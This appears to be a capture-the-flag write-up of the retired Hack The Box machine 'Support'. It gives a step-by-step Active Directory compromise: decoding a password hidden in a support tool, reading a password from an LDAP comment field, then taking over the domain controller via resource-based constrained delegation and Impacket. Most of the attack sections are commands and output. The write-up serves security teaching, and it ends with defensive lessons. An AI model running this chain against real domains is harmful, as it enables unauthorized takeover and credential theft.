---
layout: post
title: "The Help Desk Had a Master Key"
subtitle: "HTB Support, where an IT tool hands you a password it tried to hide, a help account leaves a second password in a comment field, and a help desk's permissions over the domain controller let you mint a fake computer and walk out as Administrator"
date: 2022-12-24 12:00:00 +0000
description: "A reversed support tool leaks one password, an LDAP comment field leaks another, and a help desk's quiet authority over the domain controller mints a fake computer that becomes Administrator."
image: /assets/og/the-help-desk-had-a-master-key.png
tags: [hackthebox, writeup]
---

Support is a box about the people whose whole job is having the keys. The help desk holds passwords so it can help, and that helpfulness leaks twice. First a little IT tool sitting on an open file share carries a hidden password it scrambles just badly enough to feel safe, and unscrambling it is an afternoon's curiosity. Then that password reads the directory and finds a second one written in plain sight, parked in a comment field on a shared account because someone needed somewhere convenient to keep it. And the account that second password opens belongs to a help desk that, on this domain, was handed quiet authority over the domain controller itself. Nobody breaks anything here. You just keep picking up keys that were left on the counter, and the last key on the counter mints a brand-new computer that the domain trusts enough to hand you Administrator.

```
        S U P P O R T   I T   D E S K
        =============================
        \\support-tools\   "help yourself"
              UserInfo.exe  -> a password, xor'd, base64'd,
                               feeling clever and hiding nothing
                     |
                     v
        ldap reads the directory and finds, in a comment field,
              a second password just sitting there
                     |
                     v
        that account is help desk. help desk owns the DC.
        so you forge a computer the domain agrees to trust,
        and ask it nicely for Administrator.
                                            鍵
```

## 0x01 · the open counter

Thirteen ports answer, and they sing one note. DNS, Kerberos on 88, LDAP on 389 and 636, SMB on 445, the global catalog up on 3268, WinRM on 5985, the AD web services framing port on 9389. A quick `nmap -sC -sV` does not so much scan this host as introduce it. This is a domain controller for `support.htb`, and it is wearing the full Active Directory uniform.

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds?
636/tcp  open  ssl/ldap
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp open  mc-nmf        .NET Message Framing
```

A domain controller is the building's keyring. It is the one machine that knows every user, every password hash, every permission in the whole organization. Picture the front desk at a company where one binder holds everyone's badge and every door's combination. Get to the binder and the building is yours. That binder is what we are walking toward, one leaked key at a time.

## 0x02 · the tool that scrambled a secret

SMB answers without a login, so list the shares as nobody.

```
# smbclient -N -L //10.10.11.174
        Sharename       Type      Comment
        ---------       ----      -------
        support-tools   Disk      support staff tools
        ...
```

`support-tools` is not a default share, which means a human put it there on purpose. Inside are the usual help-desk staples, PuTTY and 7-Zip and Wireshark, and one thing that does not belong in a pile of public downloads. A file named `UserInfo.exe.zip`. Pull it.

```
# smbclient -N //10.10.11.174/support-tools -c "get UserInfo.exe.zip"
```

Unzipped, `UserInfo.exe` is a .NET console app, which is the gentlest reversing target there is. A .NET binary does not really compile down to raw machine code. It compiles to an intermediate language that still carries the original method names, the variable names, the structure, all of it. Think of it like a book translated into shorthand instead of shredded. A tool like ILSpy or dnSpy reads the shorthand straight back into the original sentences. So we open the binary and just read the source.

What it does is look up users in LDAP, which means it has to log in to LDAP, which means it is carrying a password. And there it is, in a class politely named `Protected`. A base64 blob, a key, and a tiny routine that mixes them together.

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");

// for each byte:  plain = enc[i]  XOR  key[i % len]  XOR  223
```

This is not encryption so much as a costume. XOR with a fixed key and a fixed constant is a reversible shuffle, and the byte that undoes it is the byte that did it. Picture sliding every letter forward by the same amount to scramble a note, then handing the recipient the exact amount you slid. Anyone holding the note and the number reads it instantly, and here the number is sitting in the same file as the note. Undoing it is a few lines.

```
# python3 -c '
from base64 import b64decode
from itertools import cycle
enc = b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
print("".join(chr(e ^ k ^ 223) for e,k in zip(enc, cycle(key))))'
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

The decompiled code also tells us who that password belongs to, because the tool spells out the login it builds: `support\ldap`. One key off the counter. It does not log into the box, but it logs into the directory, and the directory is where the next key is hiding.

## 0x03 · the comment field that talked

With the `ldap` account we can read the directory the same way the tool did. Point `ldapsearch` at the domain and ask it to dump everything under the base.

```
# ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' \
    -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'DC=support,DC=htb'
```

That is a wall of output, and the trick is knowing what is unusual. Most attributes on a user object are boilerplate. But every so often a human writes something into a free-text field, and humans write the worst things into free-text fields. Scrolling the `support` user object, the `info` attribute is not empty.

```
dn: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
```

The `info` field is a notes column, the digital equivalent of a sticky note on the monitor. Someone needed to remember this account's password and the directory had a blank box, so the password went in the box. `Ironside47pleasure40Watchful` is not encrypted, not encoded, not hidden. It is a comment. And the account it belongs to sits in `Remote Management Users`, which is the group that grants WinRM, which is a remote shell.

```
# evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
████████████████████████████████
```

Two passwords, two leaks, zero exploits. The interesting half of the box starts now, and it starts with that second group membership.

## 0x04 · the help desk that outranked the DC

The `support` account also belongs to `Shared Support Accounts`, and a group name is just a label until you ask what it can actually do. The way to ask, in Active Directory, is to map permissions, and the tool for that is BloodHound. Collect the data with the credentials we already hold.

```
# bloodhound-python -c All -u support -p 'Ironside47pleasure40Watchful' \
    -d support.htb -ns 10.10.11.174
```

BloodHound draws the domain as a graph of who can do what to whom, and it surfaces a single edge that ends the box. `Shared Support Accounts` has `GenericAll` over the domain controller's own computer object. `GenericAll` is total control. Picture the help desk holding not a key to one office but the deed to the building itself, written so they can repaint any room they like. They were probably given it to reset things and manage machines, but the domain does not distinguish between "fix the printer" and "rewrite who I trust." Control of the DC object is control of the DC.

The cleanest way to cash that in is Resource-Based Constrained Delegation, which sounds like a mouthful and is really one simple trick. Delegation is a feature that lets one computer act on a user's behalf, the way a valet is allowed to drive your car for you. RBCD just moves the guest list of who is allowed to do that valet job, and it stores that list as an attribute on the target computer. We can write attributes on the DC. So we add ourselves to its valet list.

But to be a valet you have to be a computer, and we are only a user. That is fine, because Active Directory lets ordinary users create computer accounts by default, a setting called the machine account quota, usually left at ten. So we forge one. Impacket does each step.

```
# impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' \
    -computer-name 'ICEBERG$' -computer-pass 'Icb_f0rged!1' -dc-ip 10.10.11.174
[*] Successfully added machine account ICEBERG$ with password Icb_f0rged!1.

# impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' \
    -delegate-to 'DC$' -delegate-from 'ICEBERG$' -action write -dc-ip 10.10.11.174
[*] Delegation rights modified successfully!
[*] ICEBERG$ can now impersonate users on DC$ via S4U2Proxy
```

Read that last line slowly. The fake computer we just invented, signed `ICEBERG`, is now on the domain controller's list of trusted valets. Nobody approved it. We wrote the list ourselves because the help desk's permissions let us.

## 0x05 · the ticket that wore a crown

Now we drive the car. Kerberos is the ticketing system at the heart of Active Directory. You prove who you are once and get a ticket, and you hand that ticket to services instead of re-entering a password. The delegation extensions, S4U2Self and S4U2Proxy, let a trusted computer request a ticket on behalf of someone else. We are trusted now, so we ask for a ticket to the DC's file service, and we ask for it as `administrator`.

```
# impacket-getST -spn 'cifs/dc.support.htb' -impersonate administrator \
    support.htb/'ICEBERG$':'Icb_f0rged!1' -dc-ip 10.10.11.174
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

That `.ccache` file is a Kerberos ticket that says, on the domain's own authority, that we are Administrator talking to the DC. Think of it like a backstage pass the venue printed itself and then handed to the wrong person. Nobody at the door will question it, because the venue made it. Load it into the environment and use it. No password required, because the ticket is the password now.

```
# export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
# impacket-secretsdump -k -no-pass dc.support.htb
Administrator:500:aad3b...:████████████████████████████████:::
[*] Kerberos keys grabbed
```

`secretsdump` pulls the domain's full hash store, including Administrator, which is the binder we set out for in section one. From there a ticket or a pass-the-hash gets a shell as the top of the building.

```
# impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb
C:\> whoami
nt authority\system
C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

## 0x06 · the honest caveat

There is no CVE on Support. Not one. Every door on this box was a feature working exactly as designed, used by someone it was not meant for. That is the part worth carrying out of the lab, because it is the part that does not get patched on a Tuesday.

The two leaked passwords are the easy lesson and still the most common one in real networks. A secret stored anywhere a person can reach is a secret that will eventually be read by the wrong person, and lightly scrambling it, the way `UserInfo.exe` did, only changes how long the afternoon takes. The comment field is worse precisely because it looks innocent. A notes box feels like nowhere, so people write everywhere into it, and `info`, `description`, and comment attributes across a directory are some of the first places a real attacker reads. The directory remembers everything you type into it and shows it to anyone who can authenticate.

But the privesc is the one I would lose sleep over, because nothing was broken there either. A help desk group was handed total control over the domain controller, almost certainly by an admin who wanted them to manage machines and did not think through the difference between managing a machine and owning the directory. The machine account quota that let us forge a computer ships at ten by default, an open invitation most domains never close. RBCD is not an exploit. It is a delegation feature riding on top of permissions that were too broad, and you cannot upgrade your way out of permissions that were too broad. You can only draw them tighter. The most dangerous account in a network is rarely the loudest. It is the helpful one that quietly outranks the thing it supports.

## 0x07 · outro

```
the tool scrambled a password and called it hidden.
the directory kept a password in a notes field and called it convenient.
the help desk held the deed to the building and called it support.

no exploit fired. every door was a feature, held open from the inside.

read the binary. read the comment field. read who really owns the DC. wear black.

                                                            EOF
```

---

*HTB: Support, retired 17 Dec 2022. An easy Windows domain controller that is really a lecture on stored secrets and over-broad trust, with not a single CVE in the chain. The forged computer still trusts you in a lab and nowhere you don't own.*